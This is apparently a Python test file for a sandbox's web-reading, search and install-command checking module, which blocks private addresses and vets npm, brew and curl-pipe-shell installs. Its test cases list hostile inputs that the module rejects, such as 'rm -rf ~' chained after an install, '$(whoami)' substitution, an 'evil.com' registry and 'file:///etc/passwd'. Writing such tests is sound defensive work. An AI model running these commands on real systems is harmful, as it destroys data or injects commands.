"""62 号单：读网页、联网搜索、安装命令核对、安装包底细。

依据：docs/积木库/沙盒接入/方案.md 技术设计“读网页”“搜索”“命令核对”。
全部用假网络：替换 blocks_web._resolve（域名 → 地址）、_open（单次请求）、_get_json、_post_json，
不真联网。
"""
import os
import unittest
from unittest import mock

from collab import blocks_web as web
from collab.blocks import BlockError

PUBLIC = "93.184.216.34"


class FakeNet:
    """按网址给固定回应；没登记的网址当作连不上。"""

    def __init__(self, pages=None, hosts=None):
        self.pages = pages or {}
        self.hosts = hosts or {}
        self.opened = []

    def resolve(self, host):
        return self.hosts.get(host, [PUBLIC])

    def open(self, url, timeout, limit):
        self.opened.append(url)
        if url not in self.pages:
            raise OSError("连不上")
        status, location, body = self.pages[url]
        return status, location, body[:limit + 1]


class NetCase(unittest.TestCase):
    def use(self, net):
        self.net = net
        p1 = mock.patch.object(web, "_resolve", side_effect=net.resolve)
        p2 = mock.patch.object(web, "_open", side_effect=net.open)
        p3 = mock.patch.dict(os.environ, {}, clear=False)
        for p in (p1, p2, p3):
            p.start()
            self.addCleanup(p.stop)
        os.environ.pop(web.ALLOW_LOCAL_ENV, None)


HTML = (b"<html><head><title>Install</title><style>.x{color:red}</style><script>var a='npm i -g evil'</script>"
        b"</head><body><h1>\xe5\xae\x89\xe8\xa3\x85</h1><pre><code>npm install -g "
        b"@amap-lbs/amap-gui</code></pre><p>then&nbsp;run &lt;tool&gt;</p></body></html>")


class ReadPage(NetCase):
    def test_reads_text_without_tags_scripts_styles(self):
        self.use(FakeNet({"https://lbs.amap.com/cli": (200, "", HTML)}))
        page = web.read_page("https://lbs.amap.com/cli")
        self.assertEqual(page["url"], "https://lbs.amap.com/cli")
        self.assertEqual(page["domain"], "lbs.amap.com")
        self.assertIn("npm install -g @amap-lbs/amap-gui", page["text"])
        self.assertIn("安装", page["text"])
        self.assertIn("then run <tool>", page["text"])
        self.assertNotIn("evil", page["text"], "脚本里的字不算页面正文")
        self.assertNotIn("color:red", page["text"])

    def test_only_https(self):
        self.use(FakeNet())
        for bad in ("http://lbs.amap.com/", "ftp://x.com/a", "file:///etc/passwd", "lbs.amap.com", "", None, 3):
            with self.assertRaises(BlockError):
                web.read_page(bad)
        self.assertEqual(self.net.opened, [])

    def test_private_addresses_blocked_before_connecting(self):
        hosts = {"localhost": ["127.0.0.1"], "lan.example.com": ["192.168.1.10"], "meta.example.com": ["169.254.169.254"],
                 "v6.example.com": ["::1"], "mixed.example.com": [PUBLIC, "10.0.0.5"], "zero.example.com": ["0.0.0.0"]}
        self.use(FakeNet(hosts=hosts))
        for host in hosts:
            with self.assertRaises(BlockError) as ctx:
                web.read_page(f"https://{host}/a")
            self.assertRegex(str(ctx.exception), r"[一-鿿]")
        for raw in ("https://127.0.0.1/", "https://[::1]/", "https://10.1.2.3/"):
            with self.assertRaises(BlockError):
                web.read_page(raw)
        self.assertEqual(self.net.opened, [], "私有地址一律在连接之前挡住")

    def test_unresolvable_host(self):
        self.use(FakeNet(hosts={"nowhere.example.com": []}))
        with self.assertRaises(BlockError):
            web.read_page("https://nowhere.example.com/")

    def test_redirects_followed_and_each_hop_checked(self):
        net = FakeNet({"https://a.com/": (301, "https://b.com/x", b""),
                       "https://b.com/x": (302, "/y", b""),
                       "https://b.com/y": (200, "", b"<p>ok page</p>")})
        self.use(net)
        page = web.read_page("https://a.com/")
        self.assertEqual(page["url"], "https://b.com/y")
        self.assertIn("ok page", page["text"])

    def test_redirect_to_private_blocked(self):
        net = FakeNet({"https://a.com/": (302, "https://inside.example.com/", b"")},
                      hosts={"inside.example.com": ["127.0.0.1"]})
        self.use(net)
        with self.assertRaises(BlockError):
            web.read_page("https://a.com/")
        self.assertEqual(net.opened, ["https://a.com/"])

    def test_redirect_to_http_blocked(self):
        self.use(FakeNet({"https://a.com/": (302, "http://a.com/", b"")}))
        with self.assertRaises(BlockError):
            web.read_page("https://a.com/")

    def test_too_many_redirects(self):
        pages = {f"https://a.com/{i}": (302, f"https://a.com/{i + 1}", b"") for i in range(10)}
        self.use(FakeNet(pages))
        with self.assertRaises(BlockError):
            web.read_page("https://a.com/0")

    def test_too_big(self):
        self.use(FakeNet({"https://a.com/": (200, "", b"x" * (web.MAX_PAGE_BYTES + 10))}))
        with self.assertRaises(BlockError):
            web.read_page("https://a.com/")

    def test_http_error_and_connect_error(self):
        self.use(FakeNet({"https://a.com/": (404, "", b"not found")}))
        with self.assertRaises(BlockError):
            web.read_page("https://a.com/")
        with self.assertRaises(BlockError):
            web.read_page("https://b.com/")

    def test_text_for_clerk_is_capped(self):
        self.use(FakeNet({"https://a.com/": (200, "", b"<p>" + b"word " * 20000 + b"</p>")}))
        page = web.read_page("https://a.com/")
        self.assertLessEqual(len(web.clerk_text(page)), web.CLERK_TEXT_LIMIT + 200)

    def test_walkthrough_switch_allows_local_http(self):
        net = FakeNet({"http://127.0.0.1:8123/p": (200, "", b"<p>local</p>")}, hosts={})
        self.use(net)
        with mock.patch.dict(os.environ, {web.ALLOW_LOCAL_ENV: "1"}):
            page = web.read_page("http://127.0.0.1:8123/p")
        self.assertIn("local", page["text"])


class CommandOnPage(unittest.TestCase):
    def test_whitespace_insensitive_exact_match(self):
        text = "Run:  npm   install -g\n@amap-lbs/amap-gui  then"
        self.assertTrue(web.command_on_page("npm install -g @amap-lbs/amap-gui", text))
        self.assertFalse(web.command_on_page("npm install -g @amap-lbs/amap-gui2", "npm install -g @amap-lbs/amap-gui"))
        self.assertFalse(web.command_on_page("npm install -g x", ""))
        self.assertFalse(web.command_on_page("", "anything"))


class ParseInstall(unittest.TestCase):
    def test_npm_forms(self):
        for cmd in ("npm install -g @amap-lbs/amap-gui", "npm i -g @amap-lbs/amap-gui",
                    "npm install --global @amap-lbs/amap-gui", "npm install @amap-lbs/amap-gui -g"):
            spec = web.parse_install(cmd)
            self.assertEqual(spec["type"], "npm")
            self.assertEqual(spec["package"], "@amap-lbs/amap-gui")
            self.assertEqual(spec["args"], ["npm", "install", "-g", "@amap-lbs/amap-gui"])
        spec = web.parse_install("npm install -g @openai/codex@latest")
        self.assertEqual(spec["package"], "@openai/codex")
        self.assertEqual(spec["args"][-1], "@openai/codex@latest")

    def test_brew_forms(self):
        spec = web.parse_install("brew install node")
        self.assertEqual((spec["type"], spec["name"], spec["cask"]), ("brew", "node", False))
        self.assertEqual(spec["args"], ["brew", "install", "node"])
        spec = web.parse_install("brew install --cask codex")
        self.assertEqual((spec["name"], spec["cask"]), ("codex", True))
        self.assertEqual(spec["args"], ["brew", "install", "--cask", "codex"])

    def test_brew_third_party_tap_refused(self):
        with self.assertRaises(BlockError) as ctx:
            web.parse_install("brew install vendor/tap/tool")
        self.assertIn("第三方", str(ctx.exception))

    def test_script_forms(self):
        spec = web.parse_install("curl https://cursor.com/install -fsS | bash")
        self.assertEqual(spec["type"], "script")
        self.assertEqual(spec["script_url"], "https://cursor.com/install")
        self.assertEqual(spec["shell"], "bash")
        spec = web.parse_install("curl -fsSL https://example.com/install.sh | sh")
        self.assertEqual((spec["script_url"], spec["shell"]), ("https://example.com/install.sh", "sh"))

    def test_script_must_be_https_single_pipe_plain_shell(self):
        for bad in ("curl http://x.com/i | sh", "curl https://x.com/i | sudo bash", "curl https://x.com/i | bash -s -- --yes",
                    "curl https://x.com/i | python3", "curl https://x.com/i -o /tmp/a | sh", "wget -qO- https://x.com/i | sh",
                    "curl https://x.com/i | sh | sh", "curl https://x.com/a https://x.com/b | sh"):
            with self.assertRaises(BlockError, msg=bad):
                web.parse_install(bad)

    def test_dangerous_shapes_refused(self):
        for bad in ("sudo npm install -g x", "npm install -g x && rm -rf ~", "npm install -g x; echo hi",
                    "npm install -g $(whoami)", "npm install -g `id`", "npm install -g x > /tmp/a",
                    "npm install x", "npm install -g x y", "npm install -g --registry=https://evil.com x",
                    "npm install -g ../local", "npm install -g git+https://github.com/a/b", "npm install -g X_Upper",
                    "pip install x", "pipx install x", "brew install", "brew install --HEAD node", "brew tap a/b",
                    "npm install -g x\nrm -rf ~", ""):
            with self.assertRaises(BlockError, msg=bad):
                web.parse_install(bad)


class PackageInfo(unittest.TestCase):
    def test_npm_info(self):
        meta = {"name": "@amap-lbs/amap-gui", "time": {"created": "2026-03-27T03:13:39.192Z"},
                "dist-tags": {"latest": "1.0.3"}, "maintainers": [{"name": "amap-lbs-op", "email": "x@y.com"}],
                "versions": {"1.0.3": {"bin": {"amap-gui": "dist/cli/index.js"}}}}
        with mock.patch.object(web, "_get_json", return_value=(200, meta)) as get:
            info = web.npm_info("@amap-lbs/amap-gui")
        self.assertIn("registry.npmjs.org/@amap-lbs%2famap-gui", get.call_args[0][0].lower())
        self.assertEqual(info["latest"], "1.0.3")
        self.assertEqual(info["created"], "2026-03-27")
        self.assertEqual(info["publishers"], ["amap-lbs-op"])
        self.assertEqual(info["commands"], ["amap-gui"])
        self.assertNotIn("x@y.com", str(info), "发布者邮箱不显示")

    def test_npm_bin_as_string_uses_package_name(self):
        meta = {"name": "tool", "time": {"created": "2020-01-01T00:00:00Z"}, "dist-tags": {"latest": "1.0.0"},
                "maintainers": [], "versions": {"1.0.0": {"bin": "cli.js"}}}
        with mock.patch.object(web, "_get_json", return_value=(200, meta)):
            self.assertEqual(web.npm_info("tool")["commands"], ["tool"])

    def test_npm_missing_package(self):
        with mock.patch.object(web, "_get_json", return_value=(404, {})):
            with self.assertRaises(BlockError) as ctx:
                web.npm_info("not-a-real-pkg-zzz")
        self.assertIn("查不到", str(ctx.exception))

    def test_brew_info(self):
        with mock.patch.object(web, "_get_json", return_value=(200, {"name": "node", "desc": "JS runtime"})) as get:
            info = web.brew_info("node", cask=False)
        self.assertIn("formulae.brew.sh/api/formula/node.json", get.call_args[0][0])
        self.assertTrue(info["exists"])
        with mock.patch.object(web, "_get_json", return_value=(200, {"token": "codex"})) as get:
            web.brew_info("codex", cask=True)
        self.assertIn("/api/cask/codex.json", get.call_args[0][0])
        with mock.patch.object(web, "_get_json", return_value=(404, {})):
            with self.assertRaises(BlockError):
                web.brew_info("nope", cask=False)

    def test_new_package_flag(self):
        self.assertTrue(web.is_new("2026-11-01", today="2026-11-09"))
        self.assertFalse(web.is_new("2026-03-27", today="2026-11-09"))


class Search(unittest.TestCase):
    def test_search_ok(self):
        body = {"results": [{"title": "安装", "url": "https://lbs.amap.com/a", "content": "c" * 1000, "score": 0.9}]}
        with mock.patch.object(web, "_post_json", return_value=(200, body)) as post:
            items = web.search("高德 CLI", "tvly-abc")
        url, payload, headers = post.call_args[0][:3]
        self.assertEqual(url, "https://api.tavily.com/search")
        self.assertEqual(payload["query"], "高德 CLI")
        self.assertLessEqual(payload["max_results"], 5)
        self.assertEqual(headers["Authorization"], "Bearer tvly-abc")
        self.assertEqual(items[0]["url"], "https://lbs.amap.com/a")
        self.assertLessEqual(len(items[0]["snippet"]), 300)

    def test_search_errors_in_plain_words(self):
        for code, word in ((401, "密钥"), (403, "密钥"), (429, "太频繁"), (432, "额度"), (433, "额度"), (500, "")):
            with mock.patch.object(web, "_post_json", return_value=(code, {"detail": {"error": "tvly-abc bad"}})):
                with self.assertRaises(web.SearchError) as ctx:
                    web.search("x", "tvly-abc")
            self.assertIn(word, str(ctx.exception))
            self.assertNotIn("tvly-abc", str(ctx.exception))
            self.assertEqual(ctx.exception.status, code)

    def test_search_needs_key_and_query(self):
        with self.assertRaises(BlockError):
            web.search("x", "")
        with self.assertRaises(BlockError):
            web.search("", "tvly-abc")

    def test_network_failure(self):
        with mock.patch.object(web, "_post_json", side_effect=OSError("down")):
            with self.assertRaises(web.SearchError):
                web.search("x", "tvly-abc")

    def test_extract_used_as_fallback_reader(self):
        body = {"results": [{"url": "https://a.com/", "raw_content": "npm install -g foo"}]}
        with mock.patch.object(web, "_post_json", return_value=(200, body)) as post:
            text = web.tavily_extract("https://a.com/", "tvly-abc")
        self.assertEqual(post.call_args[0][0], "https://api.tavily.com/extract")
        self.assertIn("npm install -g foo", text)


class VerifyInstall(NetCase):
    PAGE = b"<pre>npm install -g @amap-lbs/amap-gui</pre>"
    META = {"name": "@amap-lbs/amap-gui", "time": {"created": "2026-03-27T00:00:00Z"}, "dist-tags": {"latest": "1.0.3"},
            "maintainers": [{"name": "amap-lbs-op"}], "versions": {"1.0.3": {"bin": {"amap-gui": "x.js"}}}}

    def test_npm_verified(self):
        self.use(FakeNet({"https://lbs.amap.com/cli": (200, "", self.PAGE)}))
        with mock.patch.object(web, "_get_json", return_value=(200, self.META)):
            spec = web.verify_install("https://lbs.amap.com/cli", "npm install -g @amap-lbs/amap-gui")
        self.assertEqual(spec["type"], "npm")
        self.assertEqual(spec["source"], "https://lbs.amap.com/cli")
        self.assertEqual(spec["domain"], "lbs.amap.com")
        self.assertEqual(spec["args"], ["npm", "install", "-g", "@amap-lbs/amap-gui"])
        self.assertEqual(spec["command"], "amap-gui")
        self.assertEqual(spec["package"]["publishers"], ["amap-lbs-op"])
        self.assertIn("found_by", spec)

    def test_command_not_on_page(self):
        self.use(FakeNet({"https://lbs.amap.com/cli": (200, "", b"<p>welcome</p>")}))
        with mock.patch.object(web, "_get_json", return_value=(200, self.META)):
            with self.assertRaises(BlockError) as ctx:
                web.verify_install("https://lbs.amap.com/cli", "npm install -g @amap-lbs/amap-gui")
        self.assertIn("没找到", str(ctx.exception))

    def test_fallback_to_tavily_extract_when_plain_read_misses(self):
        self.use(FakeNet({"https://a.com/": (200, "", b"<div id=app></div>")}))
        with mock.patch.object(web, "_get_json", return_value=(200, self.META)), \
                mock.patch.object(web, "tavily_extract", return_value="npm install -g @amap-lbs/amap-gui") as ext:
            spec = web.verify_install("https://a.com/", "npm install -g @amap-lbs/amap-gui", search_key="tvly-k")
        ext.assert_called_once()
        self.assertEqual(spec["found_by"], "tavily")

    def test_missing_package_refused(self):
        self.use(FakeNet({"https://a.com/": (200, "", b"npm install -g fake-pkg-zzz")}))
        with mock.patch.object(web, "_get_json", return_value=(404, {})):
            with self.assertRaises(BlockError):
                web.verify_install("https://a.com/", "npm install -g fake-pkg-zzz")

    def test_script_verified_needs_command_name(self):
        page = b"<code>curl https://cursor.com/install -fsS | bash</code>"
        self.use(FakeNet({"https://cursor.com/docs/cli": (200, "", page)}))
        with self.assertRaises(BlockError):
            web.verify_install("https://cursor.com/docs/cli", "curl https://cursor.com/install -fsS | bash")
        spec = web.verify_install("https://cursor.com/docs/cli", "curl https://cursor.com/install -fsS | bash",
                                  command="agent")
        self.assertEqual(spec["type"], "script")
        self.assertEqual(spec["script_host"], "cursor.com")
        self.assertEqual(spec["command"], "agent")
        self.assertTrue(spec["danger"])

    def test_script_url_private_refused(self):
        page = b"curl https://inside.example.com/i | sh"
        self.use(FakeNet({"https://a.com/": (200, "", page)}, hosts={"inside.example.com": ["10.0.0.1"]}))
        with self.assertRaises(BlockError):
            web.verify_install("https://a.com/", "curl https://inside.example.com/i | sh", command="tool")

    def test_brew_verified(self):
        self.use(FakeNet({"https://a.com/": (200, "", b"brew install node")}))
        with mock.patch.object(web, "_get_json", return_value=(200, {"name": "node"})):
            spec = web.verify_install("https://a.com/", "brew install node")
        self.assertEqual(spec["command"], "node")
        self.assertFalse(spec["danger"])

    def test_bad_command_name(self):
        self.use(FakeNet({"https://a.com/": (200, "", b"brew install node")}))
        with mock.patch.object(web, "_get_json", return_value=(200, {"name": "node"})):
            with self.assertRaises(BlockError):
                web.verify_install("https://a.com/", "brew install node", command="rm -rf")


if __name__ == "__main__":
    unittest.main()


class ReviewFixes(unittest.TestCase):
    """独立复查（2026-11-09）查出的问题，先写测试。"""

    def test_prefix_of_longer_name_is_not_a_match(self):
        self.assertFalse(web.command_on_page("npm install -g foo", "run npm install -g foo-evil now"))
        self.assertFalse(web.command_on_page("brew install node", "brew install nodejs"))
        self.assertFalse(web.command_on_page("npm install -g @a/b", "npm install -g @a/bc"))
        self.assertTrue(web.command_on_page("npm install -g foo", "$ npm install -g foo\nthen"))
        self.assertTrue(web.command_on_page("npm install -g foo", "`npm install -g foo`"))
        self.assertTrue(web.command_on_page("npm install -g foo", "运行npm install -g foo。"))

    def test_sudo_inside_a_name_is_ok(self):
        self.assertEqual(web.parse_install("npm install -g pseudo-tool")["package"], "pseudo-tool")
        with self.assertRaises(BlockError):
            web.parse_install("sudo npm install -g x")

    def test_shared_address_space_blocked(self):
        self.assertTrue(web._bad_ip("100.64.0.1"))
        self.assertTrue(web._bad_ip("::ffff:127.0.0.1"))

    def test_npm_versions_not_dict(self):
        meta = {"name": "x", "time": {}, "dist-tags": {"latest": "1"}, "maintainers": "bad", "versions": ["1"]}
        with mock.patch.object(web, "_get_json", return_value=(200, meta)):
            info = web.npm_info("x")
        self.assertEqual(info["commands"], [])
